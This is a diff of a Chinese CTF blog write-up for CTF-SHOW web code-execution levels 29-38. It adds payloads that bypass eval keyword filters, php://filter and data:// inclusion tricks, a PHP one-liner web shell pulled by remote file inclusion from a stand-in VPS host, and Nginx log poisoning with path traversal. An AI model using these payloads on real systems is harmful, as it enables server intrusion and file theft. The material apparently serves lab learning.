@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      434 字
+      755 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6
+      11
        分钟
     </span>
   
@@ -229,64 +229,77 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：September 16, 2021 pm
+                  本文最后更新于：September 18, 2021 am
                 
               </p>
             
             <div class="markdown-body">
-              <h3 id="WEB-29"><a href="#WEB-29" class="headerlink" title="WEB 29"></a>WEB 29</h3><p>源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">error_reporting(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 关闭错误报告</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;  <span class="hljs-comment">// 检测变量是否已设置并且非null</span><br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;  <br>    <span class="hljs-comment">// 正则匹配</span><br>    <span class="hljs-comment">//    /i表示大小写不敏感</span><br>    <span class="hljs-comment">//    preg_match()正则匹配函数，匹配成功返回1，否则返回0</span><br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
+              <h3 id="WEB-29"><a href="#WEB-29" class="headerlink" title="WEB 29"></a>WEB 29</h3><p>这关过滤了flag关键字</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=system(<span class="hljs-string">&quot;ls&quot;</span>);  <span class="hljs-comment">// 查看当前文件夹下的文件</span><br>/?c=system(<span class="hljs-string">&quot;cat f*&quot;</span>);  <span class="hljs-comment">// 查看flag.php文件内容</span><br></code></pre></td></tr></table></figure>
 
-<p>分析源码后可知，改代码接收一个GET请求的参数c，并且会过滤flag关键字</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/?c=system(&quot;ls&quot;);<br></code></pre></td></tr></table></figure>
-
-<p>使用ls查看当前目录下的内容，看到flag.php</p>
-<img src="/img/CTF-SHOW-WEB入门-代码执行/29-1.png" srcset="/img/loading.gif" lazyload>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/?c=system(&quot;cat f*&quot;);<br></code></pre></td></tr></table></figure>
-
-<p>使用正则表达式进行读取，查看源码即可获得flag</p>
-<img src="/img/CTF-SHOW-WEB入门-代码执行/29-2.png" srcset="/img/loading.gif" lazyload>
-
-<h3 id="WEB-30"><a href="#WEB-30" class="headerlink" title="WEB 30"></a>WEB 30</h3><p>源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs PHP">error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
-
-<p>这道题过滤了flag、system和php等关键字，可以使用其他函数来进行解题</p>
+<h3 id="WEB-30"><a href="#WEB-30" class="headerlink" title="WEB 30"></a>WEB 30</h3><p>这关过滤了flag、system和php关键字</p>
 <h4 id="方法一：passthru-函数"><a href="#方法一：passthru-函数" class="headerlink" title="方法一：passthru()函数"></a>方法一：passthru()函数</h4><p>passthru()：执行外部命令并且显示原始输出</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">/?c=passthru(&quot;ls&quot;);<br>/?c=passthru(&quot;cat f*&quot;);<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=passthru(<span class="hljs-string">&quot;ls&quot;</span>);<br>/?c=passthru(<span class="hljs-string">&quot;cat f*&quot;</span>);<br></code></pre></td></tr></table></figure>
 
-<p>执行命令后查看源码即可</p>
-<img src="/img/CTF-SHOW-WEB入门-代码执行/30-2.png" srcset="/img/loading.gif" lazyload>
+<h4 id="方法二：echo命令"><a href="#方法二：echo命令" class="headerlink" title="方法二：echo命令"></a>方法二：echo命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">echo</span> `ls`;<br>/?c=<span class="hljs-keyword">echo</span> `cat f*`;<br></code></pre></td></tr></table></figure>
 
-
-
-<h4 id="方法二：echo命令"><a href="#方法二：echo命令" class="headerlink" title="方法二：echo命令"></a>方法二：echo命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">/?c=echo `ls`;<br>/?c=echo `cat f*`;<br></code></pre></td></tr></table></figure>
-
-<p>执行命令后查看源码即可</p>
-<img src="/img/CTF-SHOW-WEB入门-代码执行/30-2.png" srcset="/img/loading.gif" lazyload>
-
-
-
-<h4 id="方法三：exec命令"><a href="#方法三：exec命令" class="headerlink" title="方法三：exec命令"></a>方法三：exec命令</h4><p>思路：将flag.php复制为1.txt直接访问即可</p>
+<h4 id="方法三：exec命令"><a href="#方法三：exec命令" class="headerlink" title="方法三：exec命令"></a>方法三：exec命令</h4><p>还有个思路三，将flag.php复制为1.txt直接访问即可，我想着，执行次操作是不是需要查看一下当前路径下的文件呢 -，-</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">/?c=exec(`cp fla* 1.txt`);    <br>/1.txt<br></code></pre></td></tr></table></figure>
 
-<img src="/img/CTF-SHOW-WEB入门-代码执行/30-3.png" srcset="/img/loading.gif" lazyload>
-
-<h3 id="WEB-31"><a href="#WEB-31" class="headerlink" title="WEB 31"></a>WEB 31</h3><p>源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>这关过滤的更多</p>
+<h3 id="WEB-31"><a href="#WEB-31" class="headerlink" title="WEB 31"></a>WEB 31</h3><p>这关过滤的是flag、system、php、cat、sort、shell以及点、空格、单引号</p>
 <p>解题思路：</p>
 <p>1、system()可以替换为passthru()替换；</p>
 <p>2、cat可以使用tac/more/less替换（查看源码和不需要查看源码的区别）；</p>
 <p>3、空格可以使用tab（%09）替换；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/?c=passthru(&quot;tac%09f*&quot;);<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=passthru(<span class="hljs-string">&quot;tac%09f*&quot;</span>);<br></code></pre></td></tr></table></figure>
 
-<p>成功拿到flag</p>
-<img src="/img/CTF-SHOW-WEB入门-代码执行/31-1.png" srcset="/img/loading.gif" lazyload>
+<h3 id="WEB-32"><a href="#WEB-32" class="headerlink" title="WEB 32"></a>WEB 32</h3><p>在31关的基础上过滤了echo、分号和左括号</p>
+<p>解题思路：</p>
+<p>1、?&gt;来代替分号</p>
+<p>2、使用include+伪协议</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br>/?c=<span class="hljs-variable">$nice</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-</span><br>encode/resource=flag.php<br></code></pre></td></tr></table></figure>
 
+<h3 id="WEB-33"><a href="#WEB-33" class="headerlink" title="WEB 33"></a>WEB 33</h3><p>在32关的基础上过滤了双引号</p>
+<p>payload跟上一关差不多，取消双引号即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[url]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br>/?c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//filter/read=convert.base64-</span><br>encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="WEB-34"><a href="#WEB-34" class="headerlink" title="WEB 34"></a>WEB 34</h3><p>在33关的基础上过滤了冒号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[url]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br>/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="WEB-35"><a href="#WEB-35" class="headerlink" title="WEB 35"></a>WEB 35</h3><p>在34关的基础上过滤了”&lt;”和”=”</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[url]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br>/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="WEB-36"><a href="#WEB-36" class="headerlink" title="WEB 36"></a>WEB 36</h3><p>在35关的基础上过滤了数字</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[url]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="WEB-37"><a href="#WEB-37" class="headerlink" title="WEB 37"></a>WEB 37</h3><h4 id="方法一：通过data协议来执行php代码，读取flag"><a href="#方法一：通过data协议来执行php代码，读取flag" class="headerlink" title="方法一：通过data协议来执行php代码，读取flag"></a>方法一：通过data协议来执行php代码，读取flag</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&quot;cat f*&quot;);<span class="hljs-meta">?&gt;</span></span><br>/?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="方法二：利用文件包含漏洞"><a href="#方法二：利用文件包含漏洞" class="headerlink" title="方法二：利用文件包含漏洞"></a>方法二：利用文件包含漏洞</h4><p>1、远程vps创建文件shell.txt，内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;hacker&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>2、蚁剑添加连接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//be6e0b8e-31c3-4489-895b-f8e27360656b.challenge.ctf.show:8080/?c=http://www.vps.com/shell.txt</span><br></code></pre></td></tr></table></figure>
+
+<p>3、读取/var/www/html/flag.php文件，获得flag</p>
+<h3 id="WEB-38"><a href="#WEB-38" class="headerlink" title="WEB 38"></a>WEB 38</h3><p>过滤了php关键字</p>
+<h4 id="方法一：data伪协议"><a href="#方法一：data伪协议" class="headerlink" title="方法一：data伪协议"></a>方法一：data伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="方法二：文件包含漏洞"><a href="#方法二：文件包含漏洞" class="headerlink" title="方法二：文件包含漏洞"></a>方法二：文件包含漏洞</h4><p>同WEB 37</p>
+<h4 id="方法三：Nginx日志getshell"><a href="#方法三：Nginx日志getshell" class="headerlink" title="方法三：Nginx日志getshell"></a>方法三：Nginx日志getshell</h4><p>1、burp抓取数据包，在UA添加一句话后门</p>
+<img src=/img/CTF-SHOW-WEB入门-代码执行/38-1.png>
+
+<p>2、访问nginx日志文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">view-source:http:<span class="hljs-comment">//0406781d-bfc1-40a7-922b-1fe227444101.challenge.ctf.show:8080/?c=../../../../../../../..//var/log/nginx/access.log</span><br></code></pre></td></tr></table></figure>
+
+<p>我们添加的php一句话已经被解析了，可以看到下面三个引号要在上面上个引号稍微后一点点</p>
+<img src=/img/CTF-SHOW-WEB入门-代码执行/38-2.png>
+
+<p>3、蚁剑连接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//0406781d-bfc1-40a7-922b-1fe227444101.challenge.ctf.show:8080/?c=../../../../../../../..//var/log/nginx/access.log</span><br></code></pre></td></tr></table></figure>
+
+<p>在/var/www/html/flag.php里面即可找到flag</p>
 
             </div>
             <hr>
